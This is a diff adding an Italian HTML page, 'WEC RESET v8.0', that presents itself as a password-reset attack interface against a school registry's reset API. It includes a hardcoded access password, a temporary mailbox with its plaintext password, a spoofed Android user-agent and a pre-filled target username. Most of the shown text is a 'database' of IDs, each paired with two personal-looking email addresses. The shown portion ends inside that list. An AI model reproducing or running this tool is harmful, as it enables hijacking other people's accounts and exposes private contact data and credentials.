@@ -1,0 +1,1436 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WEC RESET // DOPPIO CHECK + DATABASE</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Share Tech Mono', monospace;
+            background: #000;
+            color: #0f0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 1000px;
+            border: 2px solid #0f0;
+            padding: 20px;
+            background: #000;
+            box-shadow: 0 0 30px rgba(0,255,0,0.2);
+            max-height: 95vh;
+            overflow-y: auto;
+        }
+
+        .header {
+            border-bottom: 1px solid #0f0;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+
+        .header h1 {
+            font-size: 24px;
+            font-weight: normal;
+            letter-spacing: 2px;
+        }
+
+        .header small {
+            color: #080;
+            font-size: 11px;
+        }
+
+        .status-bar {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 20px;
+            padding: 10px;
+            border: 1px solid #0f0;
+            background: #001100;
+        }
+
+        .led {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #080;
+        }
+
+        .led.active {
+            background: #0f0;
+            box-shadow: 0 0 10px #0f0;
+            animation: pulse 1s infinite;
+        }
+
+        .led.wait {
+            background: #ff0;
+            box-shadow: 0 0 10px #ff0;
+        }
+
+        @keyframes pulse {
+            0%,100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        .login-area {
+            margin-bottom: 20px;
+            border: 1px solid #0f0;
+            padding: 15px;
+            background: #001100;
+        }
+
+        .prompt {
+            color: #0f0;
+            margin-bottom: 5px;
+        }
+
+        .prompt:before {
+            content: "$ ";
+            color: #0f0;
+        }
+
+        input, .attack-input {
+            width: 100%;
+            padding: 12px;
+            background: #000;
+            border: 2px solid #0f0;
+            color: #0f0;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+
+        input:focus, .attack-input:focus {
+            outline: none;
+            border-color: #0f0;
+            box-shadow: 0 0 15px rgba(0,255,0,0.3);
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background: #000;
+            border: 2px solid #0f0;
+            color: #0f0;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 16px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            cursor: pointer;
+        }
+
+        button:hover:not(:disabled) {
+            background: #0f0;
+            color: #000;
+            box-shadow: 0 0 20px #0f0;
+        }
+
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            border-color: #080;
+        }
+
+        .search-section {
+            margin-bottom: 25px;
+            border: 1px solid #0f0;
+            padding: 15px;
+            background: #001100;
+        }
+
+        .search-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+            color: #0f0;
+            font-size: 14px;
+        }
+
+        .search-header span {
+            margin-right: 10px;
+            color: #ff0;
+        }
+
+        .search-container {
+            position: relative;
+            margin-bottom: 15px;
+        }
+
+        #searchInput {
+            width: 100%;
+            padding: 12px;
+            background: #000;
+            border: 2px solid #0f0;
+            color: #0f0;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 16px;
+        }
+
+        .autocomplete-list {
+            position: absolute;
+            top: 100%;
+            left: 0;
+            right: 0;
+            background: #001100;
+            border: 1px solid #0f0;
+            border-top: none;
+            max-height: 250px;
+            overflow-y: auto;
+            z-index: 1000;
+            display: none;
+        }
+
+        .autocomplete-list.visible {
+            display: block;
+        }
+
+        .autocomplete-item {
+            padding: 12px;
+            cursor: pointer;
+            border-bottom: 1px solid #0a3f0a;
+            color: #0f0;
+            font-size: 13px;
+            transition: background 0.2s;
+        }
+
+        .autocomplete-item:hover {
+            background: #003300;
+        }
+
+        .autocomplete-item .id {
+            color: #ff0;
+            margin-right: 10px;
+            font-weight: bold;
+        }
+
+        .autocomplete-item .email {
+            color: #0f0;
+            font-size: 12px;
+            margin-left: 10px;
+            opacity: 0.8;
+        }
+
+        .results-area {
+            margin-top: 15px;
+            border-top: 1px solid #0f0;
+            padding-top: 15px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+
+        .result-item {
+            padding: 10px;
+            margin-bottom: 5px;
+            border: 1px solid #0a3f0a;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .result-item:hover {
+            background: #003300;
+            border-color: #0f0;
+        }
+
+        .result-item .main-info {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+
+        .result-item .badge {
+            color: #ff0;
+            font-weight: bold;
+        }
+
+        .result-item .email-preview {
+            color: #0f0;
+            font-size: 12px;
+            opacity: 0.8;
+        }
+
+        .attack-section {
+            margin-top: 25px;
+            border: 2px solid #0f0;
+            padding: 20px;
+            background: #000;
+        }
+
+        .attack-title {
+            color: #ff0;
+            font-size: 16px;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .attack-title:before {
+            content: "⚡";
+            margin-right: 10px;
+        }
+
+        .terminal {
+            margin: 20px 0;
+            border: 1px solid #0f0;
+            background: #000;
+        }
+
+        .term-header {
+            padding: 8px 12px;
+            background: #001100;
+            border-bottom: 1px solid #0f0;
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+        }
+
+        .term-body {
+            padding: 15px;
+            min-height: 250px;
+            max-height: 300px;
+            overflow-y: auto;
+            font-size: 13px;
+            line-height: 1.8;
+            background: #000;
+            font-family: 'Share Tech Mono', monospace;
+        }
+
+        .line {
+            margin-bottom: 8px;
+            word-break: break-all;
+            border-left: 2px solid #0f0;
+            padding-left: 10px;
+        }
+
+        .line-response {
+            border-left-color: #ff0;
+            background: #001100;
+            padding: 8px;
+            margin-left: 10px;
+            margin-bottom: 15px;
+            font-size: 12px;
+        }
+
+        .line-response pre {
+            color: #ff0;
+            white-space: pre-wrap;
+            font-family: inherit;
+            margin-top: 5px;
+        }
+
+        .line-debug {
+            border-left-color: #0ff;
+            background: #001122;
+            color: #0ff;
+            padding: 8px;
+            margin-left: 10px;
+            margin-bottom: 15px;
+            font-size: 11px;
+        }
+
+        .success { color: #0f0; }
+        .error { color: #f00; }
+        .wait { color: #ff0; }
+        .info { color: #0f0; opacity: 0.7; }
+        .debug { color: #0ff; }
+
+        .cursor {
+            display: inline-block;
+            width: 8px;
+            height: 16px;
+            background: #0f0;
+            animation: blink 1s infinite;
+            margin-left: 5px;
+        }
+
+        @keyframes blink {
+            0%,50% { opacity: 1; }
+            51%,100% { opacity: 0; }
+        }
+
+        .result-box {
+            margin-top: 20px;
+            padding: 15px;
+            border: 2px solid #0f0;
+            background: #001100;
+            display: none;
+        }
+
+        .result-box.show {
+            display: block;
+        }
+
+        .result-item-display {
+            margin: 10px 0;
+            padding: 10px;
+            border-left: 3px solid #0f0;
+        }
+
+        .stats-badge {
+            color: #080;
+            font-size: 11px;
+            margin-left: 10px;
+        }
+
+        .domain-stats {
+            color: #ff0;
+            margin-left: 20px;
+            font-size: 12px;
+        }
+
+        .email-found {
+            color: #0f0;
+            margin-left: 20px;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>⎈ WEC RESET v8.0 ⎈</h1>
+            <small>DATABASE INTEGRATO • RICERCA STILE GOOGLE</small>
+        </div>
+
+        <!-- Status -->
+        <div class="status-bar">
+            <div class="led" id="led"></div>
+            <span id="statusText">ACCESS LOCKED</span>
+            <span style="margin-left: auto; color: #080;" id="statsDisplay"></span>
+        </div>
+
+        <!-- Login Area -->
+        <div class="login-area" id="loginArea">
+            <div class="prompt">PASSWORD DI ACCESSO</div>
+            <input type="password" id="accessPassword" placeholder="inserisci password..." autocomplete="off">
+            <button id="loginBtn" onclick="checkPassword()">⏻ ACCEDI AL TERMINAL</button>
+        </div>
+
+        <!-- Search Section (hidden initially) -->
+        <div class="search-section" id="searchSection" style="display: none;">
+            <div class="search-header">
+                <span>🔍</span> MOTORE DI RICERCA DATABASE
+                <span class="stats-badge" id="dbStats"></span>
+            </div>
+            
+            <div class="search-container">
+                <input type="text" id="searchInput" placeholder="Cerca per ID, nome, cognome o @dominio..." autocomplete="off">
+                <div class="autocomplete-list" id="autocompleteList"></div>
+            </div>
+
+            <div class="results-area" id="resultsArea"></div>
+        </div>
+
+        <!-- Attack Section (hidden initially) -->
+        <div class="attack-section" id="attackSection" style="display: none;">
+            <div class="attack-title">INTERFACCIA DI ATTACCO</div>
+            
+            <div class="prompt">username target</div>
+            <input type="text" id="attackUsername" class="attack-input" placeholder="dedaloroma130774" value="dedaloroma130774">
+            <button id="startAttackBtn" onclick="startAttack()">⚡ EXECUTE RESET ATTACK</button>
+        </div>
+
+        <!-- Terminal -->
+        <div class="terminal">
+            <div class="term-header">
+                <span>root@wec:~/reset</span>
+                <span id="currentUA">Dalvik/2.1.0 (Android 16)</span>
+            </div>
+            <div class="term-body" id="terminal"></div>
+        </div>
+
+        <!-- Result -->
+        <div class="result-box" id="resultBox">
+            <div class="result-item-display">
+                <div class="result-label">USERNAME</div>
+                <div class="result-value" id="resultUsername"></div>
+            </div>
+            <div class="result-item-display">
+                <div class="result-label">PASSWORD</div>
+                <div class="result-value" id="resultPassword"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        // CONFIGURAZIONE
+        // ============================================================
+        const ACCESS_PASSWORD = "111685";
+        const BASE_MAIL = "https://api.mail.tm";
+        const EMAIL = "bypassdedalo@dollicons.com";
+        const EMAIL_PASSWORD = "LAgw$TXfXY3tBLN";
+        const URL_RESET = "https://registro.orsoline.it/oneClickSchoolWs/api/resetPwd/resetPassword";
+
+        // HEADER FISSI per TUTTE le richieste
+        const FIXED_HEADERS = {
+            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 16; A142P Build/BP2A.250605.031.A3)',
+            'Connection': 'Keep-Alive',
+            'Accept-Encoding': 'gzip',
+            'Content-Type': 'application/json; charset=utf-8'
+        };
+
+        // ============================================================
+        // DATABASE COMPLETO
+        // ============================================================
+        const database = [
+            {id: '130769', email1: 'cristiana.ruzzettu@gmail.com', email2: 'fabio.faldetta@gmail.com'},
+            {id: '130770', email1: 'c.margani@gmail.com', email2: 'gabriele.bruni@gmail.com'},
+            {id: '130771', email1: 'e.primeri@libero.it', email2: 'max02062002@gmail.com'},
+            {id: '130772', email1: 'sarafalcone.sm@gmail.com', email2: 'borrinif@gmail.com'},
+            {id: '130773', email1: 'cristinamontesi@hotmail.com', email2: 'ruggerobusetti@libero.it'},
+            {id: '130774', email1: 'giorgialeva@live.it', email2: 'fabiociarletta@gmail.com'},
+            {id: '130775', email1: 'carmela.pepe@hotmail.it', email2: 'francesco.smeragliuolo@gmail.com'},
+            {id: '130776', email1: 'daniela.carosi@live.com', email2: 'nicola.macri@cultura.gov.it'},
+            {id: '130777', email1: 'daniela.carosi@live.com', email2: 'nicola.macri@cultura.gov.it'},
+            {id: '130778', email1: 'lucia.pellegrino@corteconti.it', email2: 'hdemia2002@yahoo.it'},
+            {id: '130779', email1: 'bgiancola@yahoo.it', email2: 'Giraffa.Antonio@gdf.it'},
+            {id: '130780', email1: 'c.marotti@yahoo.it', email2: 'simona.maiuri@icloud.com'},
+            {id: '130781', email1: 'mcortesani@gmail.it', email2: 'andrea.pietrangeli.1977@gmail.com'},
+            {id: '130783', email1: 'brunella.appicciafuoco@gmail.com', email2: 'manuel.patacca@gmail.com'},
+            {id: '130787', email1: 'elisa.ercoli86@gmail.com', email2: 'sotgiuandrea86@tiscali.it'},
+            {id: '130788', email1: 'freddy.code@gmail.com', email2: 'giorgio.fontana@gmail.com'},
+            {id: '130790', email1: 'giada.daddario@gmail.com', email2: 'andresgalanchillon@gmail.com'},
+            {id: '130791', email1: 'c.rapetti@icloud.com', email2: 'edmondo@mgita.com'},
+            {id: '130793', email1: 'eusepi66@gmail.com', email2: 'josielle_ale_gael@hotmail.com'},
+            {id: '130794', email1: 'barbara.pestilli@gmail.com', email2: 'gp.zizzo@yahoo.it'},
+            {id: '130795', email1: 'barbara.pestilli@gmail.com', email2: 'gp.zizzo@yahoo.it'},
+            {id: '130796', email1: 'simone.bonafede@libero.it', email2: 'danielabiadene@yahoo.it'},
+            {id: '130797', email1: 'simone.bonafede@libero.it', email2: 'danielabiadene@yahoo.it'},
+            {id: '130798', email1: 'ilariadamiani@libero.it', email2: 'palomar2003@libero.it'},
+            {id: '130800', email1: 'deangelisilvia@gmail.com', email2: 'alessioforgetta@gmail.com'},
+            {id: '130801', email1: 'valentinapennisi@gmail.com', email2: 'andreamartino@gmail.com'},
+            {id: '130802', email1: 'zecca_valentina@yahoo.it', email2: 'alessandro.ravasio@gmail.com'},
+            {id: '130803', email1: 'hilarogo@gmail.com', email2: 'ronroger84@gmail.com'},
+            {id: '130804', email1: 'hilarogo@gmail.com', email2: 'ronroger84@gmail.com'},
+            {id: '130805', email1: 'paris.eleonora@yahoo.it', email2: 'andreazaccagna@gmail.com'},
+            {id: '130808', email1: 'arch.antonia.donofrio@gmail.com', email2: 'piero.milotti@gmail.com'},
+            {id: '130809', email1: 'ilaria.mangino@live.it', email2: 'marchese.ivo@gdf.it'},
+            {id: '130810', email1: 'R.PILEGGI@inapp.gov.it', email2: 'mario1.lamarca@telecomitalia.it'},
+            {id: '130812', email1: 'violanteplacidomail@gmail.com', email2: 'massimilianodepiro@gmail.com'},
+            {id: '130813', email1: 'saramartiello@gmail.com', email2: 'avv.cariotibruno@gmail.com'},
+            {id: '130814', email1: 'brunetti.luci@gmail.com', email2: 'gzanolli@gmail.com'},
+            {id: '130815', email1: 'emyringhi78@hotmail.com', email2: 'valeriocaratelli@gmail.com'},
+            {id: '130816', email1: 'v.potenza@liceo-orazio.edu.it', email2: 'matteo@studiosavarese.com'},
+            {id: '130817', email1: 'giusy.nappa82@gmail.com', email2: 'alfonsodonofrio80@yahoo.it'},
+            {id: '130818', email1: 'b-rita@hotmail.it', email2: 'savorex@hotmail.com'},
+            {id: '130819', email1: 'daniela.mossini@hotmail.it', email2: 'danilo.cloud85@gmail.com'},
+            {id: '130821', email1: 'valebaldo@gmail.com', email2: 'robylamura@yahoo.it'},
+            {id: '130822', email1: 'loredanatrotta@outlook.com', email2: 'stefanoromano@outlook.com'},
+            {id: '130823', email1: 'alessandra.ciccolella@gmail.com', email2: 'stefano.iacovella@gmail.com'},
+            {id: '130828', email1: 'serenaprs@gmail.com', email2: 'pietromano@gmail.com'},
+            {id: '130829', email1: 'ilaria.carofano@gmail.com', email2: 'alissimo@hotmail.it'},
+            {id: '130831', email1: 'sspitalieri@gmail.com', email2: 'l.lantero@cimea.it'},
+            {id: '130833', email1: 'salasonia@hotmail.com', email2: 'manliomar@hotmail.com'},
+            {id: '130834', email1: 'livia.risoluti@libero.it', email2: 'estella@sogin.it'},
+            {id: '130836', email1: 'daniela.delbianco@libero.it', email2: 'filipposavoia@hotmail.com'},
+            {id: '130838', email1: 'federica.ferraiuolo83@gmail.com', email2: 'saladino.andrea@gmail.com'},
+            {id: '130839', email1: 'mikaelacaldaro@gmail.com', email2: 'mgenova@alveria.it'},
+            {id: '130840', email1: 'mikaelacaldaro@gmail.com', email2: 'mgenova@alveria.it'},
+            {id: '130841', email1: 'kela822@hotmail.com', email2: 'costa.urciuoli@gmail.com'},
+            {id: '130842', email1: 'laura.gabri@gmail.com', email2: 'tomas.kazulenas@gmail.com'},
+            {id: '130843', email1: 'lucia.marchegiani@uniroma3.it', email2: 'mrizzolli@gmail.com'},
+            {id: '130845', email1: 'claudiarug@yahoo.it', email2: 'serafino.ruscica@gmail.com'},
+            {id: '130846', email1: 'manu140778@hotmail.it', email2: 'm.alfonsi040177@gmail.com'},
+            {id: '130847', email1: 'antonilli.noemi1@gmail.com', email2: 'ing.angelo.adamo@gmail.com'},
+            {id: '130848', email1: 'francescasamperi91@gmail.com', email2: 'fabrizioivomattei@gmail.com'},
+            {id: '130849', email1: 'federicamonti788@gmail.com', email2: 'danilo_56@msn.com'},
+            {id: '130850', email1: 'lamorticellap@gmail.com', email2: 'gianluca.bigoli@gmail.com'},
+            {id: '130851', email1: 'montagna.mariacristina@gmail.com', email2: 'manuel230783@live.it'},
+            {id: '130852', email1: 'beatriceianniruberto@libero.it', email2: 'fabio.bisegna@uniroma1.it'},
+            {id: '130853', email1: 'caijianiirene@gmail.com', email2: 'zhouhao78@hotmail.com'},
+            {id: '130854', email1: 'muraristefania@gmail.com', email2: 'maxbarc@gmail.com'},
+            {id: '130855', email1: 'sara17.cingolani@gmail.com', email2: 'm.balzarini14@gmail.com'},
+            {id: '130856', email1: 'maria.fnoia@gmail.com', email2: 'gianfranco.morrone@gmail.com'},
+            {id: '130857', email1: 'pellegrini.francesca@virgilio.it', email2: 'rrezzonico1977@gmail.com'},
+            {id: '130858', email1: 'mikatonelli@gmail.com', email2: 'fabio.grimaldi@fastwebnet.it'},
+            {id: '130859', email1: 't.mulone@zetema.it', email2: 'camers@outlook.it'},
+            {id: '130860', email1: 'flavsab@gmail.com', email2: 'cesare.ramazzotti@leonardo.com'},
+            {id: '130861', email1: 'valeria.cirigliano03@gmail.com', email2: 'ema.piergentili@gmail.com'},
+            {id: '130862', email1: 'chiara.lattanzi13@gmail.com', email2: 'lucamattoni92@gmail.com'},
+            {id: '130863', email1: 'vivianadevincentis1@gmail.com', email2: 'alessandromiliti1@gmail.com'},
+            {id: '130864', email1: 'valentina.saporiti77@gmail.com', email2: 'eugenio.corsi@gmail.com'},
+            {id: '130865', email1: 'gio.picarelli85@gmail.com', email2: 'marco.ceccanti@uniroma1.it'},
+            {id: '130866', email1: 'ing.andrea.paolini@gmail.com', email2: 'gabriellabascelli@gmail.com'},
+            {id: '130867', email1: 'ing.andrea.paolini@gmail.com', email2: 'gabriellabascelli@gmail.com'},
+            {id: '130868', email1: 'f.casadei@unitus.it', email2: 'amedeodelongis@gmail.com'},
+            {id: '130869', email1: 'la.nicolosi@gmail.com', email2: 'saccag77@gmail.com'},
+            {id: '130870', email1: 'mercantiilaria72@gmail.com', email2: 'costantino1@icloud.com'},
+            {id: '130871', email1: 'alessandradiclaudio@libero.it', email2: 'tiberio.caporossi@gmail.com'},
+            {id: '130872', email1: 'rtrossitto1@gmail.com', email2: 'tmax17@gmail.com'},
+            {id: '130873', email1: 'mariaconcetta.altieri@interno.it', email2: 'iandoliparolise.antonio@gdf.it'},
+            {id: '130874', email1: 'cristiana.disanto55@gmail.com', email2: 'mirco.bianchi@yahoo.it'},
+            {id: '130875', email1: 'sarabonizzardi@gmail.com', email2: 'andreatancredi83@gmail.com'},
+            {id: '130876', email1: 'sara.montozzi@gmail.com', email2: 'gianluca.principessa@gmail.com'},
+            {id: '130877', email1: 'beatrice.perotto@gmail.com', email2: 'g.carletti0@gmail.com'},
+            {id: '130878', email1: 'helen.chiappini@gmail.com', email2: 'leonardodepalma@ymail.com'},
+            {id: '130881', email1: 'lavinia275@yahoo.it', email2: 'lavnemo@gmail.com'},
+            {id: '130882', email1: 'scalettafrancesco@libero.it', email2: 'francesca.amici14@gmail.com'},
+            {id: '130883', email1: 'patrizia.fusaro@gmail.com', email2: 'luciano.zu@gmail.com'},
+            {id: '130884', email1: 'benedetta.fruttarol@gmail.com', email2: 'ludovico.fabbri@gmail.com'},
+            {id: '130885', email1: 'raffaellaraffio@gmail.com', email2: 'claudio.coco@gmail.com'},
+            {id: '130886', email1: 'angela.pettorruso@gmail.com', email2: 'carlogiuseppe.dimaria@interno.it'},
+            {id: '130887', email1: 'ddpd@hotmail.it', email2: 'daniele_dorazi@hotmail.it'},
+            {id: '130889', email1: 'jessica92spoletini@gmail.com', email2: 'simonemagni16@gmail.com'},
+            {id: '130890', email1: 'margo.dimarco@gmail.com', email2: 'maurodilanzo@yahoo.it'},
+            {id: '130891', email1: 'mariadaniela.gliubizzi@gmail.com', email2: 'fabrizio.buceti@gmail.com'},
+            {id: '130892', email1: 'mariadaniela.gliubizzi@gmail.com', email2: 'fabrizio.buceti@gmail.com'},
+            {id: '130893', email1: 'ariballabene@hotmail.com', email2: 'ciccioguzzo2@hotmail.com'},
+            {id: '130894', email1: 'francesca.didonna@outlook.it', email2: 'giampieroasta@gmail.com'},
+            {id: '130895', email1: 'panielisabetta@gmail.com', email2: 'a.protomail@gmail.com'},
+            {id: '130898', email1: 'saratosti8@gmail.com', email2: 'erwinmonticone@gmail.com'},
+            {id: '130899', email1: 'elepinzi@yahoo.com', email2: 'formisan@yahoo.it'},
+            {id: '130900', email1: 'cinzia.coscarelli.cc@gmail.com', email2: 'mc9459@mclink.it'},
+            {id: '130902', email1: 'marti.giovannetti@libero.it', email2: 'manuelgneo@libero.it'},
+            {id: '130904', email1: 'vferrari72@hotmail.com', email2: 'paolino_rob_halford@virgilio.it'},
+            {id: '130906', email1: 'claratitoli18@gmail.com', email2: 'a.ferrante@outlook.com'},
+            {id: '130908', email1: 'emanuelelucchini@gmail.com', email2: 'martinaguenzi4@gmail.com'},
+            {id: '130909', email1: 'francescasamperi91@gmail.com', email2: 'fabrizioivomattei@gmail.com'},
+            {id: '130911', email1: 'marzia.ciangola@gmail.com', email2: 'bione73@gmail.com'},
+            {id: '130912', email1: 'silvia.pao@libero.it', email2: 'ale.bracci@gmail.com'},
+            {id: '130913', email1: 'brunalodoli74@gmail.com', email2: 'alessandrocamboni@gmail.com'},
+            {id: '130914', email1: 'egledebonis@gmail.com', email2: 'pdimuro@gmail.com'},
+            {id: '130915', email1: 'bbonito@luiss.it', email2: 'max.minnucci@gmail.com'},
+            {id: '130916', email1: 'ale.morici@gmail.com', email2: 'giulio.miliotti@gmail.com'},
+            {id: '130917', email1: 'nicla1472@gmail.com', email2: 'massimiliano.bechini@gmail.com'},
+            {id: '130918', email1: 'vaianellaluana@yahoo.it', email2: 'roger.cal.4692@gmail.com'},
+            {id: '130919', email1: 'xiaotingyu849@gmail.com', email2: 'jiang_sophia@yahoo.com'},
+            {id: '130920', email1: 'antonellaformisano1972@gmail.com', email2: 'gfcarrubba@gmail.com'},
+            {id: '130921', email1: 'angela.tretola@enel.com', email2: 'claudio.dicembrino@gmail.com'},
+            {id: '130922', email1: 'dariocapotorto@vintieassociati.com', email2: 'rllantieri@gmail.com'},
+            {id: '130923', email1: 'danielaperciballi@virgilio.it', email2: 'mariodezi79@gmail.com'},
+            {id: '130925', email1: 'livia.balduccini@gmail.com', email2: 'fbfabio09@gmail.com'},
+            {id: '130966', email1: 'vale.sperduti83@gmail.com', email2: 'lucalucibello@gmail.com'},
+            {id: '130996', email1: 'maria.dannibale@costaassociati.it', email2: 'stefano.costa@costaassociati.it'},
+            {id: '131001', email1: 'elisa.abbadessa@gso.it', email2: 'fabiorondanini@gmail.com'},
+            {id: '131002', email1: 'elenanoccioli@yahoo.it', email2: 'giulianogt@yahoo.it'},
+            {id: '131009', email1: 'cecilia.def@gmail.com', email2: 'vittorio.vec@gmail.com'},
+            {id: '230068', email1: 'daniela.scatena@gmail.com', email2: 'asphaleia@gmail.com'},
+            {id: '230080', email1: 'sabri.fi@gmail.com', email2: 'romanademolizioni@libero.it'},
+            {id: '230073', email1: 'mariacorsi9@gmail.com', email2: 'lorenzomalagola@yahoo.it'},
+            {id: '230077', email1: 'silviamontesi@fastwebnet.it', email2: 'momo1984@libero.it'},
+            {id: '230075', email1: 'aniello.merone@gmail.com', email2: 'tinghi.vanessa@gmail.com'},
+            {id: '230078', email1: 'fraduazzo@libero.it', email2: 'arleta-fr@libero.it'},
+            {id: '230127', email1: 'mortillavale@tiscali.it', email2: 'flaviopardo@alice.it'},
+            {id: '230160', email1: 'dibenedettosara@gmail.com', email2: 'francescoscarpa@autopreneste.it'},
+            {id: '230162', email1: 'giampaolo.tancredi@gmail.com', email2: 'marchese2@gmail.com'},
+            {id: '230186', email1: 'carlo.pascuzzi@gmail.com', email2: 'leone.miryam@gmail.com'},
+            {id: '230175', email1: 's.burressimiani@gmail.com', email2: 'm.cisotto@gmail.com'},
+            {id: '230170', email1: 'monicfv1@gmail.com', email2: 'mattia.ferraresi@gmail.com'},
+            {id: '230205', email1: 'marchegiani@gmail.com', email2: 'mrizzolli@gmail.com'},
+            {id: '230176', email1: 'sspitalieri@gmail.com', email2: 'l.lantero@cimea.it'},
+            {id: '230206', email1: 'alessandragalloppa@gmail.com', email2: 'info@plexismart.com'},
+            {id: '230209', email1: 'kela822@hotmail.com', email2: 'costa.urciuoli@gmail.com'},
+            {id: '230217', email1: 'angela.tretola@enel.com', email2: 'claudio.dicembrino@gmail.com'},
+            {id: '230219', email1: 'am.zechini@libero.it', email2: 'stefanopontremolesi@gmail.com'},
+            {id: '230226', email1: 'digiorgio.natascia@gmail.com', email2: 'andrea.costa@chebanca.it'},
+            {id: '230221', email1: 'saradimario79@gmail.com', email2: 'simone.sammartino@gmail.com'},
+            {id: '230225', email1: 'marydambrosio@yahoo.it', email2: 'avv.fadda@gmail.com'},
+            {id: '230223', email1: 'giuliana.bertolone@gmail.com', email2: 'davidepucci@icloud.com'},
+            {id: '230228', email1: 'marydambrosio@yahoo.it', email2: 'avv.fadda@gmail.com'},
+            {id: '230229', email1: 'mad.detommasi@gmail.com', email2: 'elia.giu@gmail.com'},
+            {id: '230230', email1: 'stefania_zani@hotmail.com', email2: 'ipertero@gmail.com'},
+            {id: '230236', email1: 'katiusciapoeta@aol.com', email2: 'danieleloiodice@aol.com'},
+            {id: '230232', email1: 'sarafuriozzi@gmail.com', email2: 'allegriale@gmail.com'},
+            {id: '230238', email1: 'benedetta.mattoni12@gmail.com', email2: 'lorenzomalgarini@hotmail.it'},
+            {id: '230233', email1: 'mariacorsi9@gmail.com', email2: 'lorenzomalagola@yahoo.it'},
+            {id: '230247', email1: 'cristina.pascolini@gmail.com', email2: 'bugflavio@gmail.com'},
+            {id: '230235', email1: 'sedda.gio@gmail.com', email2: 'to.persico@gmail.com'},
+            {id: '230250', email1: 'vivigugliotta@gmail.com', email2: 'fabio.fava69@gmail.com'},
+            {id: '230249', email1: 'ambraonofri@yahoo.it', email2: 'salvatore@hotelpiemonte.com'},
+            {id: '230245', email1: 'manu140778@hotmail.it', email2: 'm.alfonsi040177@gmail.com'},
+            {id: '230258', email1: 'massimo.miccio@gmail.com', email2: 'anna_colia@virgilio.it'},
+            {id: '230259', email1: 'asa.mancuso@hotmail.it', email2: 'lorenzo.malandrucco@gmail.com'},
+            {id: '230234', email1: 'sedda.gio@gmail.com', email2: 'to.persico@gmail.com'},
+            {id: '230260', email1: 'asa.mancuso@hotmail.it', email2: 'lorenzo.malandrucco@gmail.com'},
+            {id: '230269', email1: 'francescalafavia@libero.it', email2: 'prizioemiliano@gmail.com'},
+            {id: '230280', email1: 'a.fidenzi@yahoo.it', email2: 'chiara.delmonte.rm@gmail.com'},
+            {id: '230268', email1: 'marilena.maiolo@gmail.com', email2: 'g.fallucca@gmail.com'},
+            {id: '230272', email1: 'viviana.devincentis@disney.com', email2: 'alessandro.militi@disney.com'},
+            {id: '230282', email1: 'Emiliano.Ranati@aceaspa.it', email2: 'valeria.borrelli@cdp.it'},
+            {id: '230274', email1: 'lucia.marchegiani@uniroma3.it', email2: 'mrizzolli@gmail.com'},
+            {id: '230256', email1: 'fabrizioramundo@gmail.com', email2: 'fbrunetta@gmail.com'},
+            {id: '230295', email1: 'dan.sorvillo@gmail.com', email2: 'n.iavasile@outlook.com'},
+            {id: '230292', email1: 'antonella@studiostefanosalvati.it', email2: 'stefano@studiostefanosalvati.it'},
+            {id: '230294', email1: 'dan.sorvillo@gmail.com', email2: 'n.iavasile@outlook.com'},
+            {id: '230296', email1: 'emanuela.mariani@me.com', email2: 'gianni.etna@gmail.com'},
+            {id: '230278', email1: 'areswilly@hotmail.it', email2: 'emderossi@yahoo.it'},
+            {id: '230291', email1: 'carmen.pilone@uniroma1.it', email2: 'cgcrucianigiuliocg@libero.it'},
+            {id: '230297', email1: 'alessia.togna@gmail.com', email2: 'pierluca.zangari@gmail.com'},
+            {id: '230298', email1: 'derya.davulcu@gmail.com', email2: 'mariogualandri@gmail.com'},
+            {id: '230300', email1: 's.sivo@hotmail.it', email2: 'batand3@yahoo.it'},
+            {id: '230281', email1: 'montagna.mariacristina@gmail.com', email2: 'manuel230783@live.it'},
+            {id: '230299', email1: 'valentina.lupi81@gmail.com', email2: 'matteo.toppetta@gmail.com'},
+            {id: '230306', email1: 'saradimario79@gmail.com', email2: 'simone.sammartino@gmail.com'},
+            {id: '230308', email1: 'grisanti.valeria@gmail.com', email2: 'piergiorgio.illomei@gmail.com'},
+            {id: '230309', email1: 'sspitalieri@gmail.com', email2: 'l.lantero@gmail.com'},
+            {id: '230310', email1: 'benedettadeleonardis87@gmail.com', email2: 'cristiano.trovato@gmail.com'},
+            {id: '230315', email1: 's.sivo@hotmail.it', email2: 'batand3@yahoo.it'},
+            {id: '230312', email1: 'francyfabris84@gmail.com', email2: 'mattia_7482@yahoo.it'},
+            {id: '230361', email1: 'annarita.tonet@bancaditalia.it', email2: 'sebastiano.laviola@bancaditalia.it'},
+            {id: '230366', email1: 'santavitto@gmail.com', email2: 'maurizio.acreman@studioacreman.it'},
+            {id: '230364', email1: 'antonellinoemi1@gmail.com', email2: 'ing.angelo.adamo@gmail.com'},
+            {id: '230372', email1: 'tomersusel@gmail.com', email2: 'adit12588@gmail.com'},
+            {id: '230371', email1: 'benedetta.mattoni12@gmail.com', email2: 'lorenzomalgarini@hotmail.it'},
